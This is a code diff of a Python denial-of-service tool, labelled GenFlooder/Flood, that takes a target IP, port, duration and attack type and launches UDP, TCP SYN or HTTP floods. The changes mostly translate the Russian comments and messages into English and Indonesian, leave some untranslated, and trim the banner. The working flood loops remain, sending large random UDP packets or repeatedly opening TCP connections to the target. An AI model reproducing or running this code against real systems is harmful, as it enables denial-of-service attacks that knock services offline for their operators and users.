@@ -12,29 +12,23 @@ import asyncio
 
 colorama.init(autoreset=True)
 
-def display_banner(): #логотип программы.
+def display_banner(): #logo program.
     banner_text = f"""
 {Fore.LIGHTYELLOW_EX}
- .d8888b.                    8888888888 888                        888                  
-d88P  Y88b                   888        888                        888                  
-888    888                   888        888                        888                  
-888         .d88b.  88888b.  8888888    888  .d88b.   .d88b.   .d88888  .d88b.  888d888 
-888  88888 d8P  Y8b 888 "88b 888        888 d88""88b d88""88b d88" 888 d8P  Y8b 888P"   
-888    888 88888888 888  888 888        888 888  888 888  888 888  888 88888888 888     
-Y88b  d88P Y8b.     888  888 888        888 Y88..88P Y88..88P Y88b 888 Y8b.     888     
- "Y8888P88  "Y8888  888  888 888        888  "Y88P"   "Y88P"   "Y88888  "Y8888  888     
-                                                                                        
+ ...
                           {Fore.LIGHTRED_EX}UDP DoS | TCP SYN | HTTP Flood
 """
     print(banner_text)
 
-def parse_arguments(): #Парсит и проверяет аргументы командной строки.
+def parse_arguments(): 
+    # Mengurai dan memvalidasi argumen baris perintah.
     if len(sys.argv) != 5:
         print(f"""
-        {Fore.LIGHTYELLOW_EX}╭───────────────────────━━━━━━━━━━━━━━━━━━━━━───────────────────╮
-        | {Fore.LIGHTGREEN_EX}Use » python {os.path.basename(__file__)} [target] [port] [duration] [attack_type] {Fore.LIGHTYELLOW_EX}| 
-        | {Fore.LIGHTGREEN_EX}Type Attacks »              {Fore.LIGHTRED_EX}UDP  {Fore.LIGHTGREEN_EX}| {Fore.LIGHTRED_EX}TCP {Fore.LIGHTGREEN_EX}| {Fore.LIGHTRED_EX}HTTP                 {Fore.LIGHTYELLOW_EX}| 
-        ╰───────────────────────━━━━━━━━━━━━━━━━━━━━━───────────────────╯
+        {Fore.LIGHTYELLOW_EX}Use » python {os.path.basename(__file__)} [target] [port] [duration] [attack_type]
+        {Fore.LIGHTGREEN_EX} Type Attacks »
+        {Fore.LIGHTGREEN_EX} UDP           
+        {Fore.LIGHTRED_EX} TCP  
+        {Fore.LIGHTGREEN_EX} HTTP              
         """)
         sys.exit(1)
     target_ip = sys.argv[1]
@@ -42,20 +36,22 @@ def parse_arguments(): #Парсит и проверяет аргументы к
     duration = int(sys.argv[3])
     attack_type = sys.argv[4].upper()
     if attack_type not in ['UDP', 'TCP', 'HTTP']:
-        print("Неверный тип атаки. Допустимые значения: UDP, TCP, HTTP")
+        print("Invalid attack type. Valid values: UDP, TCP, HTTP")
         sys.exit(1)
     return target_ip, target_port, duration, attack_type
 
-def check_target_availability(target_ip, target_port): #Проверяет доступность цели перед началом атаки.
+def check_target_availability(target_ip, target_port): 
+    # Memeriksa ketersediaan target sebelum memulai serangan.
     try:
         socket.create_connection((target_ip, target_port), timeout=5)
-        print(f"{Fore.LIGHTYELLOW_EX}[ {Fore.LIGHTRED_EX}GenFlooder {Fore.LIGHTYELLOW_EX}] {Fore.LIGHTBLUE_EX}» Цель доступна: {Fore.LIGHTGREEN_EX}{target_ip}:{target_port}")
+        print(f"{Fore.LIGHTYELLOW_EX}[ {Fore.LIGHTRED_EX}Flood {Fore.LIGHTYELLOW_EX}] {Fore.LIGHTBLUE_EX}» Target available: {Fore.LIGHTGREEN_EX}{target_ip}:{target_port}")
         return True
     except socket.error:
         print(f"{Fore.LIGHTYELLOW_EX}[ {Fore.LIGHTRED_EX}GenFlooder {Fore.LIGHTYELLOW_EX}] {Fore.LIGHTBLUE_EX}» Цель недоступна: {Fore.LIGHTRED_EX}{target_ip}:{target_port}")
         return False
 
-def udp_attack(target_ip, target_port, duration): #Инициирует UDP-атаку на указанную цель.
+def udp_attack(target_ip, target_port, duration): 
+    # Melakukan serangan UDP pada target yang ditentukan.
     udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     packet_data = random._urandom(65500)
     end_time = time.time() + duration
@@ -73,7 +69,7 @@ def tcp_syn_attack(target_ip, target_port, duration): #Инициирует TCP 
     end_time = time.time() + duration
     packets_sent = 0
 
-    print(f'{Fore.LIGHTYELLOW_EX}[ {Fore.LIGHTRED_EX}GenFlooder {Fore.LIGHTYELLOW_EX}] {Fore.LIGHTBLUE_EX}» Начата TCP SYN-атака на {Fore.LIGHTGREEN_EX}{target_ip}:{target_port} {Fore.LIGHTBLUE_EX}на {Fore.LIGHTGREEN_EX}{duration} {Fore.LIGHTBLUE_EX}секунд.')
+    print(f'{Fore.LIGHTYELLOW_EX}[ {Fore.LIGHTRED_EX}Flood {Fore.LIGHTYELLOW_EX}] {Fore.LIGHTBLUE_EX}» Начата TCP SYN-атака на {Fore.LIGHTGREEN_EX}{target_ip}:{target_port} {Fore.LIGHTBLUE_EX}на {Fore.LIGHTGREEN_EX}{duration} {Fore.LIGHTBLUE_EX}секунд.')
 
     while time.time() < end_time:
         tcp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
